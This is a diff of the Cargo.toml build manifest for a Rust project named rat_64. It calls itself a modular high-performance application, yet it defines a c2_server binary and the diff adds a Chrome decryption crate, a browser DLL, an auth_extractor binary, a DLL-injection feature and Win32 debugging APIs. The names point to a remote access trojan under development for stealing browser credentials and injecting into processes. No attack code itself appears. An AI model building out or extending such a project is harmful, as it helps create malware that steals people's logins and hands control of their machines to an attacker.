@@ -7,6 +7,10 @@ description = "A high-performance Rust application with modular architecture"
 license = "MIT"
 readme = "README.md"
 
+[workspace]
+members = [".", "chrome_decrypt"]
+resolver = "2"
+
 [profile.release]
 opt-level = 3
 lto = "fat"
@@ -40,6 +44,13 @@ debug-assertions = false
 [lib]
 name = "rat_64"
 path = "src/lib.rs"
+crate-type = ["cdylib", "rlib"]
+
+# ChromeBrowserDLL specific configuration
+[package.metadata.chrome_browser_dll]
+name = "chrome_browser_dll"
+path = "src/chrome_browser_dll.rs" 
+crate-type = ["cdylib"]
 
 [[bin]]
 name = "rat_64"
@@ -53,18 +64,15 @@ path = "src/bin/decrypt.rs"
 name = "c2_server"
 path = "src/bin/c2_server.rs"
 
-# ---------------------------
-# 依存関係（安定運用向け設定）
-# ---------------------------
+[[bin]]
+name = "auth_extractor"
+path = "src/bin/auth_extractor.rs"
+
 [dependencies]
-# Serde は std（derive つき）
 serde = { version = "1.0", features = ["derive"] }
 serde_json = "1.0"
 
-# 乱数：0.9系（デフォルトfeaturesのまま推奨API rng()/fill を使う）
-# 旧API thread_rng() を使い続けたい場合は下のコメント行に切替
 rand = "0.9.2"
-# rand = { version = "0.9.2", features = ["std", "std_rng", "thread_rng"] }
 
 # MessagePack（最小機能のみ）
 rmp-serde = { version = "1.3", default-features = false }
@@ -76,23 +84,21 @@ base64 = { version = "0.22", default-features = false, features = ["std"] }
 aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
 
 # システム情報（最小化）
-# 段階的バイナリサイズ削減（バランス重視）
 anyhow = { version = "1.0", default-features = false }  # エラー処理（最小化）
 libloading = { version = "0.8", default-features = false }  # NSSで必要
 which = { version = "8.0.0", default-features = false, features = ["real-sys"] }  # NSSで必要
-thiserror = { version = "2.0.16", default-features = false }  # エラー処理マクロ
-dirs = { version = "5.0", default-features = false }  # ディレクトリ検索用
+dirs = { version = "6.0.0", default-features = false }  # ディレクトリ検索用
 
 # 条件付き依存関係（機能別）
 log = { version = "0.4", default-features = false, optional = true }  # ログ機能
 indicatif = { version = "0.18.0", default-features = false, features = ["unicode-width"], optional = true }  # プログレスバー
+clap = { version = "4.0", features = ["derive"], optional = true }  # CLI引数解析（inject用）
 chrono = { version = "0.4", default-features = false, features = ["clock", "std"] }  # 時刻処理
-tokio = { version = "1.0", features = ["rt-multi-thread", "macros", "time", "sync", "signal", "net"] }  # async runtime（拡張版）  
+tokio = { version = "1.0", features = ["rt-multi-thread", "macros", "time", "sync", "signal", "net", "fs"] }  # async runtime（拡張版）  
 uuid = { version = "1.0", features = ["v4"] }  # UUID生成
-sysinfo = { version = "0.30", default-features = false }  # システム情報取得（ハートビート用）
+sysinfo = { version = "0.37.1", default-features = false }  # システム情報取得（ハートビート用）
 hmac = { version = "0.12", default-features = false }  # HMAC認証（リモートコマンド用）
 sha2 = { version = "0.10", default-features = false }  # SHA256ハッシュ（認証用）
-hex = { version = "0.4", default-features = false, features = ["alloc"] }   # 16進エンコーディング（署名用）
 # 必須依存関係（最小化）
 tempfile = { version = "3.8", default-features = false }
 walkdir = { version = "2.3", default-features = false }
@@ -129,9 +135,12 @@ size-optimized = ["ui-minimal", "crypto-minimal"]        # 総合サイズ最適
 database = ["browser"]
 
 # 機能グループ（段階的構成）
-basic = ["core", "browser"]                               # 基本機能：コア + ブラウザ
-extended = ["basic", "screenshot", "progress-bar"]          # 拡張機能：基本 + スクリーンショット + UI
-full = ["extended", "network", "logging"]                   # 全機能：拡張 + ネットワーク + ログ
+basic = ["core", "browser"]
+extended = ["basic", "screenshot", "progress-bar"]
+full = ["extended", "network", "logging", "inject"]
+
+# 特殊機能
+inject = ["dep:clap"]  # DLLインジェクション機能
 
 # optional deps（必要時だけ読み込む）
 [dependencies.minreq]
@@ -149,7 +158,7 @@ optional = true
 [dependencies.rusqlite]
 version = "0.37.0"
 default-features = false
-features = ["bundled", "modern_sqlite"]  # 最小限の機能のみ
+features = ["bundled", "modern_sqlite"]
 optional = true
 
 [dependencies.scrap]
@@ -168,6 +177,8 @@ windows = { version = "0.62.0", default-features = false, features = [
   "Win32_System_Rpc",
   "Win32_System_Wmi",
   "Win32_System_Variant",
+  "Win32_System_Diagnostics",
+  "Win32_System_Diagnostics_Debug",
   "Win32_UI_Shell",
   "Win32_UI_Input_KeyboardAndMouse",
   "Win32_UI_WindowsAndMessaging",
